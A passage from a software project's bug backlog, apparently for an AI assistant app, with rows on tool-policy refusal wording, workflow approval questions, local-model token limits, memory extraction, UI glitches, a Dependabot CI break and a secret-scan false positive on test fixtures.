  `pantheon-qwen3-*` is never shown the notes tools. — found while working `P22-16` — agent:`wf-effects`

- [ ] **B1101** **The dispatcher's `ToolPolicy` refusal names the wrong policy.** `tool_execution.
  _execute_tool_block_impl` answers every `tool_policy.blocks` refusal with "Execution of tool 'X' is forbade by
  the active guide-only policy." — for a `disabled_tools` entry on an ordinary turn and now for a name outside an AI
  step's list, where the loop's own refusal (which reaches the model first) says "“X” is not one of this step's
  tools." The backstop should say `tool_policy.reason_for(name)` (and "forbade" is not the word). `Verify:` the
  dispatcher's refusal for an allowlist block reads the allowlist's sentence. — found while working `P22-16` —
  agent:`wf-effects`

- [ ] **B1102** **A plain scheduled Prompt task that reaches a card is still "paused safely" — denied on the spot — where a workflow's step now waits for the person's yes.** By design for this wave (`SLICE-CD-DESIGN` § 6, expert default "Parking covers workflow steps only… file a row to bring them to parity"). A one-step workflow made with *Make this a workflow* already parks. `Verify:` a scheduled Prompt task whose run reaches a card parks as `waiting`, the person answers from the notification, and Allow resumes it once. — filed by `wf-walker`

- [ ] **B1103** **A workflow step's question is withdrawn by any message typed into the workflow's own chat.** MEASURED (`test_a_card_withdrawn_by_a_new_chat_message_says_so`): a Prompt step's card is bound to the trigger's chat (the seal needs a session), and an ordinary message there retires it (`tool_approvals.retire_for_session`), so the step takes its failure port — it now says "The question was withdrawn before anyone answered — a new message in its chat replaces a waiting question" rather than the "Pantheon restarted" it said at first. The design names this residual (§ 5). `Verify:` typing in a workflow's chat while one of its steps waits leaves the question answerable (or the chat says, before the message is sent, that it will withdraw the question). — `wf-walker`

- [ ] **B1104** **The approval cache-buster's module count disagrees with itself: the lockstep test names five modules (`tests/test_tool_approval_frontend_routing.py`) and `FORBIDDEN.md` says six.** INFERRED from `SLICE-CD-DESIGN` § 0.15 (filed as it asks; `wf-walker` touched none of those modules). `Verify:` one number, in both. — `SLICE-CD-DESIGN`, filed by `wf-walker`

- [x] **B1105** **A run waiting for a yes reads the stored word "waiting" in the Runs list until `runStatus.js` learns it.** MEASURED on wf-canvas (drive, `dark-1400-25-waiting-run-opens-on-its-step.png`): the list reads "· waiting" — `runStatusLabel('waiting')` falls back to the status itself. Design § 1.4 gives `runStatus.js` `WORDS.waiting = ['Waiting', 'Held']` and `runStatusTone('waiting') = 'pending'` in wf-walker's package; this row is the check that it landed (the canvas already falls back to the pending tone). `Verify:` on the merged tree the Runs list reads "… Waiting" with the pending mark. — found by `wf-canvas` (close at the merge if wf-walker's change is in) — **done 2026-10-02 at the merge: `wf-walker`'s change was in** (`be09845`: `runStatus.js` `RUN_PARKED_STATUSES`, `WORDS.waiting = ['Waiting', 'Held']`, the `pending` tone), as the row asked; `integrate-d` checked it on the merged tree — the Runs list reads "… Waiting · 5:25:49 AM".

- [ ] **B1106** **A local MiniMax with a *Local reply ceiling* typed at its server's window and no preset is refused and never sent again — the resend reads the caller's number, not the one the payload carries.** Measured on `w9-llm` (`3c2adc1`) through the real app against the scripted model listed as `MiniMax-M2` and served as vLLM serves a 32,768 window, 32,768 typed, a Chat-mode turn with no preset: the request carried `max_tokens: 32,768`, the server refused it, and the turn showed no reply (`/tmp/scratch-w9-llm/probe_minimax.py`). With no preset the door's number is 0 (`local_door_max_tokens(0, …)` stays unset), and the local MiniMax profile then fills the payload's length with the typed ceiling (`_apply_local_generation_stability` → `_minimax_profile_max_tokens`, `B934`) — after `stream_llm` has read the caller's 0. So the stream path's resend asks `servable_max_tokens(…, sent=0)` and never fires, `llm_call_async` sets no `_length_key` to act on, and `fitted_max_tokens` (`B1089`) sees nothing to fit. vLLM serves MiniMax-M2, so the profile does meet window-enforcing servers. Fix: let both doors judge the length the payload carries (the stream path's `tok_key`, and `llm_call_async`'s `_length_key` set after the profile), and fit against it. `Verify:` with 32,768 typed and no preset, a Chat-mode turn on a local MiniMax against a 32,768-window vLLM answers. — found while working `B1087`

- [ ] **B1107** **Auto-memory's extraction sends the last six messages whole, so a long reply makes a window-enforcing server refuse it and the pass falls back to its heuristic candidates — measured.** `services/memory/memory_extractor.py`, `extract_and_store`: the last `CONTEXT_WINDOW` (6) messages are flattened into one user message with no bound and sent to the chat's endpoint at `max_tokens=4096`. Measured through the real app against the scripted model served as vLLM serves a 20,000 window: after a 72,548-character reply the extraction request was refused (`4096 > 20000 - 19364`); after a 58,036-character reply it was accepted. On refusal the pass logs a warning and stores `_fallback_memory_candidates` instead — nothing the person sees, and worse memory. It passes no `max_tokens_floor`, so neither the resend nor the stated-window fit (`B1089`) applies, and a prompt over the window could not be answered by any length anyway. Fix: bound the transcript to what the endpoint can take (the trim the chat path uses, against `budget_context_for_model`), and opt in to the resend. Low priority. `Verify:` after a reply longer than the window, the extraction request is sent inside it and answered. — found while working `B1091`

- [ ] **B1108** **The shelf keeps "Not run yet" while the open workflow's own Runs list shows its run waiting.** MEASURED (`dark-1400-11-waiting.png`): with *Three feeds* open, the Runs list reads "… Waiting · 5:25:49 AM" and the shelf beside it "Three feeds · On · Not run yet"; reopening the room after the run reads "Last run: Success". The server's `last_real_runs` already returns a waiting run; INFERRED: the shelf is drawn when the room opens and not when a run starts or ends. `Verify:` press Run now with the room open; the shelf row reads the run's state without reopening. — found by `integrate-d`

- [ ] **B1109** **A For-each's item lines read "```json" when the model fenced its answer.** MEASURED (`dark-1400-12-runs-failed-item.png`): "Item 1 of 5: Success — ```json" for every item that answered in shape; the item's `data` is parsed (`parse_answer` accepts the fence) but the line shows the first line of the raw `text`. Real models fence JSON often. `Verify:` five items answered in a fenced shape list a word of their answer, not a fence. — found by `integrate-d`

- [ ] **B1110** **A denied step's run log says the denial three times.** MEASURED (P22-17 deny): "Resumed: Denied by rowan at 05:49: mcp__… — it was not done.", then the same sentence twice more on the step. `Verify:` a denied step's log says it once on the run and once on the step. — found by `integrate-d`

- [ ] **B1111** **The question names an MCP tool by its internal name.** MEASURED (P22-17): toast, dialog and run log say "mcp__0e311a43__send_message" where the step's own panel says "Chat: send_message"; the dialog's "Effects:" line lists stored words ("admin_change, destructive, execute_code, …"). `Verify:` the notice and the log name the tool as the panel does. — found by `integrate-d`

- [ ] **B1112** **Test this step says each effect twice.** MEASURED (P22-18, `light-390-18-test-plan.png`): the plan's "It would: runs your code in your own workstation account, not on this machine" is followed by the same sentence as a bullet; an Action step does the same ("It would: runs the command …" in `dry_run_plan`'s lines and again in the effects list) — the pattern predates wave D (P22-08). `Verify:` each effect is said once in the confirmation. — found by `integrate-d`

- [ ] **B1113** **At 390 px a workflow wider than three steps opens its run with the start cut off.** MEASURED (Runs, dark 390): *Three feeds* "Starts" at x −75…6, *Issue digest* −18…63, at the 35 % floor; *Morning inbox brief* (three columns) fits. Fit and panning reach it. INFERRED: the run view centres the graph at its zoom floor. `Verify:` a six-step run at 390 px opens with its start on screen. — found by `integrate-d`

- [ ] **B1114** **The workflow's chat is named after the step that made it, and holds a later step's write-up.** MEASURED (P22-05): the chat "[Task] Morning inbox brief · Summarise my inbox" holds only step 2's ("Write the summary up as a short message to me.") exchange. INFERRED from the code: step 1 (no delivery) made the chat in `_execute_llm_task`'s "Ensure a session exists", under its own stand-in name, and `_keep_workflow_chat` (Slice B) left it on the trigger for step 2. `Verify:` the chat a workflow writes into is named for the workflow. — found by `integrate-d`

- [ ] **B1115** **The Brain picture moves 4 px between captures, so a release-day capture rewrites `brain-*.png` with nothing changed.** MEASURED: three captures on one tree - dark rewritten 2 of 2 (2.5 %, content shifted 4 px), light 1 of 2, the shift's direction differing; best-shift residue 0.27-0.54 vs 5-6 unshifted. INFERRED: the Brain body's horizontal position at capture time is not settled. `Verify:` two captures in a row keep `brain-*.png`. - found by `integrate-d`

- [·] **B1116** **Dependabot grouped MCP 2.2.0 with six unrelated Python bumps despite the v1-only server contract.** PR #9's CI fails at `Server.list_tools` during schema checking and five test collections. Keep major MCP updates out of the pip group until a coordinated migration, and carry the other bumps separately. `Verify:` the MCP compatibility tests, full pytest CI, and Dependabot's pip policy agree. - found in PR #9 - agent:`codex-deps`

- [·] **B1117** **The secret scan rejects three later fake credentials used by a redaction regression test.** PRs #8-#10 all scan history containing the fixture commit. Excuse only the proven fixture literals, retaining default scanner rules and coverage for longer tokens. `Verify:` the allowlist honesty tests and full-history gitleaks job pass. - found in PR #9's Secret scan - agent:`codex-deps`
